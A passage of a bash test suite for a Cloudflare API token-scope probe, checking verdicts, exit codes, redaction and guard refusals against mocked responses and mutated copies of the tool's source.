assert_eq "M5d the run aborted at the settings grant probe" 2 "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
has '"probe_id_listed":false' "M5d the read-back says whether a probe-prefixed id is listed"
has "sent with CF_API_TOKEN_ZONE_SETTINGS" "M5d names the token that answered 2xx, by its Doppler key"
has_re '^probe=zone-rest write-response zones/<zone>/settings -> 200 \{"success":true,"result":\{"count":0' "M5d prints the 2xx write response as a probe= line"
has_re '^probe=zone-rest fatal zones/<zone>/settings answered 200 ' "M5d the FATAL line is a probe= line (the bootstrap filter keeps it)"
has_re '"errors":\[\]' "M5d the summary carries the errors field"
if awk '/^probe=zone-rest write-response /{w=NR} /^probe=zone-rest read-back /{r=NR} END{exit !(w && r && w < r)}' "$OUTFILE"; then ok "M5d the write response prints before the read-back"; else no "M5d the write response does not print before the read-back"; fi
lacks "verdict=pass" "M5d no pass verdict"
lacks "tok-zonesettings-mock" "M5d never prints a token value"

# --- M5e: the settings grant answering 400 err 6007 (malformed JSON) is not authorization ---
printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|400:{"success":false,"errors":[{"code":6007,"message":"Malformed JSON in request body"}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 3 "M5e settings grant 400 err 6007 -> exit 3"
has "probe=zone-rest verdict=inconclusive" "M5e prints verdict=inconclusive"
has "err 6007 malformed JSON" "M5e names why the 400 proves nothing"
# 6007 listed second, and a two-document reply, read the same way: decided on the parsed codes.
for m5e_b in '{"success":false,"errors":[{"code":1000},{"code":6007}]}' '{"success":false,"errors":[{"code":1000}]} {"success":false,"errors":[{"code":6007}]}'; do
  printf '%s\n' "/zones/[^/]+/settings\$|tok-zonesettings-mock|400:$m5e_b" >"$MOV"
  MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
  assert_rc 3 "M5e grant 400 <$m5e_b> -> exit 3"
  has_re 'zones/<zone>/settings +inconclusive \(grant got 400' "M5e grant 400 <$m5e_b> reads inconclusive"
done
# The 6007 rule is scoped to settings-json: an INVALID_BODY row's grant 400 6007 is authorized.
printf '%s\n' '/bot_management$|tok-botmgmt-mock|400:{"success":false,"errors":[{"code":6007}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 0 "M5e a bot_management grant 400 err 6007 -> exit 0 (the rule is settings-json only)"
has_re 'zones/<zone>/bot_management +authorized \(PUT 400, err 6007 after a 403 control\)' "M5e the bot_management row reads authorized with its code"

# --- M5h: the row text the runbook routes on survives the swap-0b wrapper's filter ---
# run_scope_probe (archived bootstrap.sh) captures both streams (2>&1) and keeps only
# lines matching its filter, so each migration row is also a probe=<profile> row line.
# The filter is read from the wrapper itself, never copied, so narrowing it reds here.
M5H_BOOT="$TESTDIR/../../../knowledge-base/project/specs/archive/20261120-013510-feat-one-shot-12931-cf-account-migration/bootstrap.sh"
M5H_RE="$(sed -n "s/^  printf '%s\\\\n' \"\$out\" | grep -E '\\(.*\\)' || true\$/\\1/p" "$M5H_BOOT" 2>/dev/null || true)"
M5H_CAP="$(grep -c 'out="$(bash "$tool" --profile "$1" --staged 2>&1)"' "$M5H_BOOT" 2>/dev/null || true)"
assert_eq "M5h the wrapper filter read from bootstrap.sh is the one this block replays" '^(probe=|cf-token-scope: migration)' "$M5H_RE"
assert_eq "M5h the wrapper captures stdout and stderr together (2>&1), exactly once" 1 "$M5H_CAP"
m5h_wrap() { cat "$OUTFILE" "$WORK/err.txt" 2>/dev/null | grep -E "${M5H_RE:-^\$NEVER}" || true; }
printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|400:{"success":false,"errors":[{"code":6007}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun_out --profile zone-rest
assert_rc 3 "M5h grant 400 err 6007 -> exit 3"
if grep -qF 'probe=zone-rest row zones/<zone>/settings -> inconclusive (grant got 400, err 6007' <<<"$(m5h_wrap)"; then ok "M5h the unparsed-grant row survives the wrapper filter"; else no "M5h the unparsed-grant row is dropped by the wrapper filter"; fi
printf '%s\n' '/zones/[^/]+/settings$|tok-botmgmt-mock|400:{"success":false,"errors":[{"code":10000}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun_out --profile zone-rest
assert_rc 3 "M5h deny control 400 -> exit 3"
if grep -qF 'probe=zone-rest row zones/<zone>/settings -> inconclusive (deny control CF_API_TOKEN_BOT_MANAGEMENT got 400, not 403' <<<"$(m5h_wrap)"; then ok "M5h the deny-400 row survives the wrapper filter"; else no "M5h the deny-400 row is dropped by the wrapper filter"; fi
MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' mrun_out --profile zone-rest
assert_rc 3 "M5h settings control 404 -> exit 3"
if grep -qF 'probe=zone-rest row zones/<zone>/settings -> inconclusive (settings control not established' <<<"$(m5h_wrap)"; then ok "M5h the no-control row survives the wrapper filter"; else no "M5h the no-control row is dropped by the wrapper filter"; fi
if grep -qxF 'probe=zone-rest row control: zones/<zone>/settings -> denied (404, err 7003)' <<<"$(m5h_wrap)"; then ok "M5h the failed control row survives the wrapper filter (a 404 advises no re-mint)"; else no "M5h the failed control row is dropped by the wrapper filter, or a 404 advises a re-mint"; fi
MOCK_ZSET='403:{"success":false,"errors":[{"code":10000}]}' mrun_out --profile zone-rest
assert_rc 3 "M5h settings control 403 -> exit 3"
if grep -qxF 'probe=zone-rest row control: zones/<zone>/settings -> denied (403, err 10000; re-mint CF_API_TOKEN_ZONE_SETTINGS)' <<<"$(m5h_wrap)"; then ok "M5h a 403 control row names the key to re-mint"; else no "M5h a 403 control row names no key to re-mint"; fi
# The denied write row names the grant key to re-mint, and survives the filter.
printf '%s\n' '/dns_records$|default-token-xyz789|403:{"success":false,"errors":[{"code":10000}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun_out --profile redirects-dns
assert_rc 3 "M5h DNS write denied -> exit 3"
if grep -qxF 'probe=redirects-dns row zones/<zone>/dns_records -> denied (403, err 10000; re-mint CF_API_TOKEN)' <<<"$(m5h_wrap)"; then ok "M5h the denied row survives the wrapper filter and names the grant key"; else no "M5h the denied row is dropped by the wrapper filter or names no key"; fi
# Happy paths: the exact relayed row set, in order (a missing row plus a duplicate
# reds here, not only a count), and a row line never reads as the whole-line pass.
m5h_rows() { m5h_wrap | grep "^probe=$1 row " | sed 's/ -> .*$//'; }
mrun_out --profile zone-rest
assert_rc 0 "M5h zone-rest happy path -> exit 0"
assert_eq "M5h zone-rest: exactly one whole-line pass verdict, never forged by a row line" 1 "$(m5h_wrap | grep -cx 'probe=zone-rest verdict=pass' || true)"
assert_eq "M5h zone-rest relays exactly its control and write rows" "$(printf '%s\n' 'probe=zone-rest row control: zones/<zone>/settings' 'probe=zone-rest row zones/<zone>/settings' 'probe=zone-rest row zones/<zone>/bot_management')" "$(m5h_rows zone-rest)"
lacks_err "probe=zone-rest row " "M5h row lines are stdout only"
mrun_out --profile redirects-dns
assert_rc 0 "M5h redirects-dns happy path -> exit 0"
assert_eq "M5h redirects-dns: exactly one whole-line pass verdict" 1 "$(m5h_wrap | grep -cx 'probe=redirects-dns verdict=pass' || true)"
assert_eq "M5h redirects-dns relays one row line per indented row (controls + audit + writes)" "$(grep -cE '^  [^ ]' "$OUTFILE" || true)" "$(m5h_wrap | grep -c '^probe=redirects-dns row ' || true)"
assert_eq "M5h redirects-dns relays 17 rows (2 controls + 6 audit + 9 writes)" 17 "$(m5h_wrap | grep -c '^probe=redirects-dns row ' || true)"
# Source pin: every migration row goes through mig_report. The only bare report call
# in the migration run block is mig_fatal's, which prints its own probe= lines.
M5H_BLOCK="$(awk '/^# Migration profiles \(#12931/{on=1} on {print} on && /^exit 0$/{e=1} e && /^fi$/{exit}' "$SUT" | sed 's/[[:space:]]#.*$//; /^[[:space:]]*#/d')"
assert_eq "M5h the migration run block was extracted (non-empty, ends at its fi)" 1 "$(printf '%s\n' "$M5H_BLOCK" | grep -c '^echo "probe=$PROFILE verdict=pass"$' || true)"
assert_eq "M5h exactly one bare report call in the migration run block (mig_fatal's)" 1 "$(printf '%s\n' "$M5H_BLOCK" | grep -cE '(^|[^_[:alnum:]])report[[:space:]]' || true)"
if printf '%s\n' "$M5H_BLOCK" | awk '/^mig_fatal\(\) \{/{f=1} f && /(^|[^_[:alnum:]])report[[:space:]]/{hit=1} f && /^\}/{f=0} END{exit hit?0:1}'; then ok "M5h that bare report call is inside mig_fatal"; else no "M5h a bare report call outside mig_fatal drops a row from the wrapper"; fi

# --- M5g: an empty 2xx body is named; a key in the response cannot forge a probe line ---
printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|204:' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 4 "M5g settings grant 204 with an empty body -> exit 4"
has_re '^probe=zone-rest write-response zones/<zone>/settings -> 204 \(empty body\)$' "M5g the empty write response is named, not blank"
printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|200:{"success":true,"errors":[{"code":{"probe=zone-rest verdict=pass":1}}]}' >"$MOV"
MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 4 "M5g a forged-key 2xx -> exit 4"
lacks "verdict=pass" "M5g an object key in the response cannot print a pass verdict"
has '"<redacted>":1' "M5g the forged key is redacted"

# --- M5f: the read-back lists the probe id after the 2xx -> probe_id_listed true ---
printf '%s\n' '/zones/[^/]+/settings$|tok-zonesettings-mock|200:{"success":true,"result":[]}' >"$MOV"
MOCK_ZSET_AFTER_WRITE='200:{"success":true,"result":[{"id":"ssl","value":"full"},{"id":"cf_token_scope_probe_nonexistent_setting","value":"cf_token_scope_probe_never_valid"}]}' \
  MOCK_WRITE_OVERRIDE="$MOV" mrun --profile zone-rest
assert_rc 4 "M5f settings grant 2xx with the probe id now listed -> exit 4"
has_re '^probe=zone-rest read-back zones/<zone>/settings -> 200 .*"probe_id_listed":true' "M5f the read-back reports probe_id_listed true"

# --- M6: a degraded control -> inconclusive, and no audit is read from it ---
MOCK_ACCT='200:{"success":false,"result":[]}' mrun --profile redirects-dns
assert_rc 3 "M6 degraded list control -> exit 3"
has "verdict=inconclusive" "M6 prints verdict=inconclusive"
lacks "entrypoint-absent" "M6 a degraded list never yields an entrypoint-absent claim"
MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' mrun --profile zone-rest
assert_rc 3 "M6b zone-rest control 404 -> exit 3"

# --- M7: the audit records a hand-made entrypoint by id ---
MOCK_ACCT='200:{"success":true,"result":[{"id":"0123456789abcdef0123456789abcdef","kind":"zone","phase":"http_config_settings"},{"id":"fedcba9876543210fedcba9876543210","kind":"root","phase":"http_request_redirect"}]}' mrun --profile redirects-dns
assert_rc 0 "M7 entrypoints present still pass (they become imports)"
has_re 'audit: http_config_settings +entrypoint-present id=0123456789abcdef0123456789abcdef' "M7 zone entrypoint recorded by id"
has_re 'audit: http_request_redirect +entrypoint-present id=fedcba9876543210fedcba9876543210' "M7 account root entrypoint recorded by id"
has_re 'audit: http_request_cache_settings +entrypoint-absent' "M7 the others stay absent"

# --- M8: --staged reads the _NEXT keys; a missing one stops before any request ---
MDM="$WORK/m-doppler.log"; : >"$MDM"
MOCK_DOPPLER_MARKER="$MDM" mrun --profile zone-rest --staged
assert_rc 0 "M8 --staged zone-rest -> exit 0"
if grep -qx 'CF_API_TOKEN_ZONE_SETTINGS_NEXT' "$MDM" && grep -qx 'CF_API_TOKEN_BOT_MANAGEMENT_NEXT' "$MDM" \
   && ! grep -qxE 'CF_API_TOKEN_(ZONE_SETTINGS|BOT_MANAGEMENT)' "$MDM" && ! grep -qE '^CF_(ZONE|ACCOUNT)_ID$' "$MDM"; then
  ok "M8 --staged reads only the _NEXT keys and never the Doppler zone/account ids"
else
  no "M8 --staged key binding wrong (see $MDM)"
fi
if grep -q 'tok-zonesettings-mock-next' "$MWLOG"; then ok "M8 the staged token value was presented"; else no "M8 staged token not used"; fi
MCM="$WORK/m-curl-marker"; rm -f "$MCM"
MOCK_NEXT_MISSING=CF_API_TOKEN_PAGES_NEXT MOCK_CURL_MARKER="$MCM" mrun --profile redirects-dns --staged
assert_rc 2 "M8b missing _NEXT key -> exit 2"
has "CF_API_TOKEN_PAGES_NEXT is empty or absent" "M8b names the missing staging key"
if [[ ! -e "$MCM" ]]; then ok "M8b no request was sent before every token was acquired"; else no "M8b curl ran before token acquisition finished"; fi

# --- M9: usage refusals (all before any secret read) ---
MDM9="$WORK/m9-doppler.log"; : >"$MDM9"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile redirects-dns --zone-id 5af02a2f394e9ba6e0ea23c381a26b67
assert_rc 2 "M9 the OLD zone id is refused"
has "refusing the OLD account/zone id" "M9 names the refusal"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile zone-rest --account-id 4d5ba6f096b2686fbdd404167dd4e125
assert_rc 2 "M9b the OLD account id is refused"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile redirects-dns --zone-id 'abc?x'
assert_rc 2 "M9c a non-hex id is refused"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --staged
assert_rc 2 "M9d --staged on the rulesets profile is refused"
MOCK_DOPPLER_MARKER="$MDM9" run "$MOCKPATH" --profile redirects-dns --target-entrypoint http_config_settings
assert_rc 2 "M9e --target-entrypoint on a migration profile is refused"
if [[ ! -s "$MDM9" ]]; then ok "M9 every refusal happened before any Doppler read"; else no "M9 a refusal read Doppler first"; fi
run "$MOCKPATH" --profile zone-rest --zone-id 0000000000000000000000000000000a --dry-run
assert_rc 0 "M9f a valid override id is accepted"
has "zones/0000000000000000000000000000000a/settings" "M9f the override id reaches the probe URL"

# --- M11a: the probe id listed on the zone -> refused, exit 2 before any write (Guard 3) ---
ZS_HIT1='200:{"success":true,"result":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"x"},{"id":"ssl","value":"full"}]}'
ZS_HIT2='200:{"success":true,"result":[{"id":"ssl","value":"full"},{"id":"cf_token_scope_probe_nonexistent_setting","value":"x"}]}'
for zs in "$ZS_HIT1" "$ZS_HIT2"; do
  MOCK_ZSET="$zs" mrun_out --profile zone-rest
  assert_rc 2 "M11a a listed probe id -> exit 2"
  assert_eq "M11a a listed probe id -> no write request" 0 "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
  has_re '^probe=zone-rest verdict=refused reason=probe-id-collision$' "M11a prints the refusal verdict line on stdout (stdout-only capture)"
  lacks_err "verdict=refused" "M11a the verdict line is not on stderr"
  has_re '^probe=zone-rest refused-detail .*already lists an id of SETTINGS_PROBE_BODY \(exact match: cf_token_scope_probe_nonexistent_setting\)' "M11a the detail names the exact id, as a probe= stdout line"
done
MOCK_ZSET='200:{"success":true,"result":[{"id":"cf_token_scope_probe_nonexistent_setting_other","value":"x"},{"id":"ssl","value":"full"}]}' mrun --profile zone-rest
assert_rc 0 "M11a a prefix-sharing id is not a collision (exact id match) -> exit 0"

# --- M11g: an authorized EMPTY settings list is degraded, never a vacuous pass ---
MOCK_ZSET='200:{"success":true,"result":[]}' mrun --profile zone-rest
assert_rc 3 "M11g empty settings list -> exit 3"
has "degraded (200 settings list empty)" "M11g reports the empty list as degraded"
assert_eq "M11g no /settings write under an empty list" 0 "$(grep -c '/settings ' "$MWLOG" || true)"

# --- M11e: settings control 404 -> the JSON row is skipped, the bot row is still probed ---
MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' mrun --profile zone-rest
assert_rc 3 "M11e settings control 404 -> exit 3"
has "inconclusive (settings control not established" "M11e the settings row reads inconclusive"
assert_eq "M11e no /settings write without the control" 0 "$(grep -c '/settings ' "$MWLOG" || true)"
assert_eq "M11e the bot_management row is still probed" 2 "$(grep -c '/bot_management ' "$MWLOG" || true)"

# --- M11h: two JSON documents in the settings response (the second one clear) -> degraded ---
MOCK_ZSET='200:{"success":true,"result":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"x"}]} {"success":true,"result":[{"id":"ssl","value":"full"}]}' mrun --profile zone-rest
assert_rc 3 "M11h a two-document settings response -> exit 3"
has_re 'control: zones/<zone>/settings +degraded \(200 body not success/array\)' "M11h the two-document settings control is not read as authorized"
assert_eq "M11h no /settings write under a two-document response" 0 "$(grep -c '/settings ' "$MWLOG" || true)"

# --- M11i: a listed item without a string id -> refused, settings list unevaluable ---
for zs in '200:{"success":true,"result":[1,{"id":"ssl","value":"full"}]}' '200:{"success":true,"result":[{"value":"x"},{"id":"ssl","value":"full"}]}'; do
  MOCK_ZSET="$zs" mrun_out --profile zone-rest
  assert_rc 2 "M11i an item without a string id -> exit 2"
  has_re '^probe=zone-rest verdict=refused reason=settings-list-unevaluable$' "M11i prints the refusal verdict line on stdout (stdout-only capture)"
  lacks_err "verdict=refused" "M11i the verdict line is not on stderr"
  has "refused-detail could not evaluate the zone settings list (an item is not an object with a string id)" "M11i the detail names the reachable cause once"
  assert_eq "M11i no write request" 0 "$(wc -l <"$MWLOG" | tr -d '[:space:]')"
done

# --- M11j: an inherited MIG_SETTINGS_CLEARED=1 never opens the settings row ---
MIG_SETTINGS_CLEARED=1 MOCK_ZSET='404:{"success":false,"errors":[{"code":7003}]}' mrun --profile zone-rest
assert_rc 3 "M11j inherited MIG_SETTINGS_CLEARED=1 with a 404 control -> exit 3"
assert_eq "M11j no /settings write" 0 "$(grep -c '/settings ' "$MWLOG" || true)"

# --- M11 temp-copy mutants (Guard Contract rows; run_mut, never the live tree) ---
# src_line <fixed substring>: the one source line holding it, or a marker run_mut
# reports as anchor-not-a-source-line (so a reworded guard reds, never goes vacuous).
src_line() { if [[ "$(grep -cF -- "$1" "$SUT")" == 1 ]]; then grep -F -- "$1" "$SUT"; else printf '__src_line_not_unique__<%s>' "$1"; fi; }
# shellcheck disable=SC2016  # literal source lines are the anchors
{
ZR_SET_ROW='  "zones/<zone>/settings|PATCH|$API/zones/\$ZONE/settings|CF_API_TOKEN_ZONE_SETTINGS|CF_API_TOKEN_BOT_MANAGEMENT|settings-json"'
ZR_BOT_ROW='  "zones/<zone>/bot_management|PUT|$API/zones/\$ZONE/bot_management|CF_API_TOKEN_BOT_MANAGEMENT|CF_API_TOKEN_ZONE_SETTINGS|invalid"'
RD_ROW1='  "zones/<zone>/rulesets/phases/http_request_dynamic_redirect/entrypoint|PUT|$API/zones/\$ZONE/rulesets/phases/http_request_dynamic_redirect/entrypoint|CF_API_TOKEN_RULESETS|CF_API_TOKEN_PAGES|invalid"'
SET_LIT_LINE="readonly SETTINGS_PROBE_BODY='$WANT_SET_BODY'"
PREFIX_LINE='readonly PROBE_ID_PREFIX="cf_token_scope_probe_"'
GUARD_LOOP_LINE="$(src_line '# static-guard-rows')"
INVALID_ON_SET_LINE="$(src_line 'if [[ "$g_url" == "$MIG_SETTINGS_URL_TPL" || ')"
BYTES_LINE="$(src_line '| jq -c . 2>/dev/null || true)" != "$SETTINGS_PROBE_BODY" ]]')"
GUARD_JQ_LINE="$(src_line '($p | length) >= 8 and')"
REQ_SET_LINE="$(src_line 'if [[ "$method" != "PATCH" || "$url" != ')"
COLL_INPUTS_LINE="$(src_line 'jq -rn --argjson body "$SETTINGS_PROBE_BODY"')"
COLL_HIT_LINE="$(src_line 'then "hit"')"
GATE_LINE="$(src_line '&& "$MIG_SETTINGS_CLEARED" != "1" ]]; then')"
G6007_LINE="$(src_line '"$w_kind" == "settings-json" ]] && mig_grant_unparsed; then')"
SET_CTRL_ROW='  "zones/<zone>/settings|$API/zones/\$ZONE/settings|CF_API_TOKEN_ZONE_SETTINGS|array"'
ROWS_ZR_LINE="$(src_line '"${MIG_WRITE_ZONE_REST[@]}" ;;')"
set_lit() { printf "readonly SETTINGS_PROBE_BODY='%s'" "$1"; }
MUT_ARGS=(--profile zone-rest)
# run_mut self-test: a mutant whose wanted message never prints must red exactly
# its message assertion (run_mut can say no). The counters are then restored.
rm_p="$pass"; rm_f="$fail"
run_mut "run_mut self-test" 0 4 2 "this message is never printed" "$ZR_BOT_ROW" "$ZR_BOT_ROW" >"$WORK/run-mut-self.log"
if [[ "$pass" == "$((rm_p + 4))" && "$fail" == "$((rm_f + 1))" && "$(grep -c 'message (missing: this message is never printed)' "$WORK/run-mut-self.log")" == 1 ]]; then pass="$rm_p"; fail="$rm_f"; ok "run_mut self-test: a missing message reds exactly one of its 5 assertions"
else pass="$rm_p"; fail="$rm_f"; no "run_mut self-test: a missing message did not red exactly one assertion"; fi
# Guard 1 (the static table guard): every one refused before any Doppler read.
run_mut "M11b bot_management row -> settings-json" 2 0 0 "off the zone settings PATCH" "$ZR_BOT_ROW" "${ZR_BOT_ROW%invalid\"}settings-json\""
run_mut "M11b a third settings-json row on another URL" 2 0 0 "off the zone settings PATCH" "$ZR_BOT_ROW" "$ZR_BOT_ROW"$'\n''  "zones/<zone>/dns_records|POST|$API/zones/\$ZONE/dns_records|CF_API_TOKEN|CF_API_TOKEN_PAGES|settings-json"'
run_mut "M11b settings-json PATCH on another URL (the URL half alone)" 2 0 0 "off the zone settings PATCH" "$ZR_BOT_ROW" '  "zones/<zone>/bot_management|PATCH|$API/zones/\$ZONE/bot_management|CF_API_TOKEN_BOT_MANAGEMENT|CF_API_TOKEN_ZONE_SETTINGS|settings-json"'
run_mut "M11b settings-json PUT on the settings URL (the method half alone)" 2 0 0 "off the zone settings PATCH" "$ZR_SET_ROW" "${ZR_SET_ROW/|PATCH|/|PUT|}"
run_mut "M11c an unknown body-kind on a redirects-dns row" 2 0 0 "not invalid or settings-json" "$RD_ROW1" "${RD_ROW1%invalid\"}bogus\""
run_mut "M11k a DELETE method on the second row is refused before the first row's write" 2 0 0 "not PUT/POST/PATCH" "$ZR_BOT_ROW" "${ZR_BOT_ROW/|PUT|/|DELETE|}"
run_mut "M11l a row off the Cloudflare API base" 2 0 0 "does not target the Cloudflare API base" "$ZR_BOT_ROW" '  "zones/<zone>/bot_management|PUT|https://example.invalid/zones/\$ZONE/bot_management|CF_API_TOKEN_BOT_MANAGEMENT|CF_API_TOKEN_ZONE_SETTINGS|invalid"'
run_mut "M11m a migration profile with no write rows" 2 0 0 "has no write rows" "$ROWS_ZR_LINE" '    zone-rest)     : ;;'
run_mut "M11m an EMPTY write table (printf prints one blank line) names the real cause" 2 0 0 "has no write rows" "$ZR_SET_ROW" '' "$ZR_BOT_ROW" ''
run_mut "M11n a second settings control" 2 0 0 "has 2 settings controls" "$SET_CTRL_ROW" "$SET_CTRL_ROW"$'\n'"$SET_CTRL_ROW"
run_mut "M11n the settings control's URL drifted (the guard would read no list)" 2 0 0 "has 0 settings controls" "$SET_CTRL_ROW" "${SET_CTRL_ROW/settings|CF_/settings?per_page=50|CF_}"
run_mut "M2w invalid on the settings URL with a trailing slash is refused too" 2 0 0 "uses body-kind invalid on the zone settings URL" "$ZR_SET_ROW" '  "zones/<zone>/settings|PATCH|$API/zones/\$ZONE/settings/|CF_API_TOKEN_ZONE_SETTINGS|CF_API_TOKEN_BOT_MANAGEMENT|invalid"'
run_mut "M2w the settings row reverted to invalid (the live defect) is refused" 2 0 0 "uses body-kind invalid on the zone settings URL" "$ZR_SET_ROW" "${ZR_SET_ROW%settings-json\"}invalid\""
# The same revert with that refusal neutered reproduces the measured defect through
# the mock: the deny control gets 400 6007, so the row can never pass.
run_mut "M2w the revert with its refusal neutered reproduces the live defect" 3 3 2 "got 400, not 403" \
  "$ZR_SET_ROW" "${ZR_SET_ROW%settings-json\"}invalid\"" "$INVALID_ON_SET_LINE" '        if false; then'
assert_eq "MUT M2w the settings grant is never probed after the 400 control" 0 "$(grep -c '/settings tok-zonesettings-mock ' "$MWLOG" || true)"
MUT_ARGS=(--profile rulesets)
run_mut "M11c a corrupt zone-rest row refuses a rulesets-profile run too (every profile)" 2 0 0 "not invalid or settings-json" "$ZR_BOT_ROW" "${ZR_BOT_ROW%invalid\"}bogus\""
MUT_ARGS=(--profile redirects-dns)
run_mut "M11c a corrupt zone-rest row refuses a redirects-dns run too" 2 0 0 "not invalid or settings-json" "$ZR_BOT_ROW" "${ZR_BOT_ROW%invalid\"}bogus\""
MUT_ARGS=(--profile zone-rest)
run_mut "Guard 1 #6 the closed-case arms swapped" 3 3 2 "got 400, not 403" \
  '        invalid) w_body="$INVALID_BODY" ;;' '        invalid) w_body="$SETTINGS_PROBE_BODY" ;;' \
  '          w_body="$SETTINGS_PROBE_BODY" ;;' '          w_body="$INVALID_BODY" ;;'
# Dispatch: with the static loop emptied, mig_req alone refuses at the write boundary.
run_mut "Guard 1 dispatch: static loop emptied, a PUT to the settings URL (method half alone)" 2 0 2 "which is not a PATCH to the zone settings URL" \
  "$GUARD_LOOP_LINE" '  for mig_row in ; do  # static-guard-rows' "$ZR_SET_ROW" "${ZR_SET_ROW/|PATCH|/|PUT|}"
run_mut "Guard 1 dispatch: static loop emptied, a PATCH to .../bot_management/settings (URL)" 2 2 2 "which is not a PATCH to the zone settings URL" \
  "$GUARD_LOOP_LINE" '  for mig_row in ; do  # static-guard-rows' "$ZR_BOT_ROW" '  "zones/<zone>/bot_management|PATCH|$API/zones/\$ZONE/bot_management/settings|CF_API_TOKEN_BOT_MANAGEMENT|CF_API_TOKEN_ZONE_SETTINGS|settings-json"'
run_mut "Guard 1 dispatch: static loop and mig_req's check both neutered -> the JSON body reaches bot_management" 0 4 2 "probe=zone-rest verdict=pass" \
  "$GUARD_LOOP_LINE" '  for mig_row in ; do  # static-guard-rows' "$REQ_SET_LINE" '          if false; then' "$ZR_BOT_ROW" "${ZR_BOT_ROW%invalid\"}settings-json\""
assert_eq "MUT Guard 1 dispatch: with both checks gone, bot_management received SETTINGS_PROBE_BODY" 2 "$(m_body_n PUT '/bot_management$' "$SET_BODY")"
run_mut "Guard 1 H2 zone-rest rows reordered (settings second) still pass" 0 4 2 "probe=zone-rest verdict=pass" \
  "$ZR_SET_ROW"$'\n'"$ZR_BOT_ROW" "$ZR_BOT_ROW"$'\n'"$ZR_SET_ROW"
assert_eq "MUT Guard 1 H2 reordered: the settings row still carries SETTINGS_PROBE_BODY" 2 "$(m_body_n PATCH '/settings$' "$SET_BODY")"
assert_eq "MUT Guard 1 H2 reordered: the bot row still carries INVALID_BODY" 2 "$(m_body_n PUT '/bot_management$' "$INV_BODY")"
# Guard 2 (SETTINGS_PROBE_BODY bytes and shape): each refused before any Doppler read.
G2_MSG="SETTINGS_PROBE_BODY is not probe-shaped"
run_mut "M11d body not JSON" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit "${WANT_SET_BODY%\}}")"
run_mut "M11d body {\"items\":[]}" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[]}')"
run_mut "M11d body a JSON array" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '[{"id":"cf_token_scope_probe_x","value":"y"}]')"
run_mut "M11d a second, non-prefixed item" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"cf_token_scope_probe_never_valid"},{"id":"ssl","value":"off"}]}')"
run_mut "M11d an extra top-level key beside items" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_token_scope_probe_nonexistent_setting","value":"cf_token_scope_probe_never_valid"}],"ssl":"off"}')"
run_mut "M11d an extra key inside an item" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_token_scope_probe_x","value":"y","z":1}]}')"
run_mut "M11d an id with another prefix (cf_x_)" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"cf_x_nonexistent","value":"y"}]}')"
run_mut "M11d items an object, not an array" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":{"k":{"id":"cf_token_scope_probe_x","value":"y"}}}')"
run_mut "M11d a duplicate id key naming a real setting first" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"ssl","id":"cf_token_scope_probe_x","value":"on"}]}')"
run_mut "M11d a duplicate top-level items key" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"ssl","value":"off"}],"items":[{"id":"cf_token_scope_probe_x","value":"y"}]}')"
run_mut "M11d non-compact JSON (bytes are not jq's rendering)" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items": [{"id":"cf_token_scope_probe_x","value":"y"}]}')"
run_mut "M11d two JSON documents (jq -e reads only the last)" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[{"id":"ssl","value":"off"}]}'$'\n''{"items":[{"id":"cf_token_scope_probe_x","value":"y"}]}')"
run_mut "M11d PROBE_ID_PREFIX emptied (startswith would match every id)" 2 0 0 "$G2_MSG" "$PREFIX_LINE" 'readonly PROBE_ID_PREFIX=""'
MUT_ARGS=(--profile zone-rest --dry-run)
run_mut "M11d a corrupt body refuses --dry-run too (no recipe is printed)" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[]}')"
lacks "curl --disable" "MUT M11d the refused dry-run printed no recipe"
MUT_ARGS=(--profile rulesets)
run_mut "M11d a corrupt body refuses a rulesets-profile run too" 2 0 0 "$G2_MSG" "$SET_LIT_LINE" "$(set_lit '{"items":[]}')"
MUT_ARGS=(--profile zone-rest)
run_mut "Guard 2 dispatch: shape check neutered, empty items -> nothing else refuses, the run passes" 0 4 2 "probe=zone-rest verdict=pass" \
  "$GUARD_JQ_LINE" "       'true' >/dev/null 2>&1; then" "$SET_LIT_LINE" "$(set_lit '{"items":[]}')"
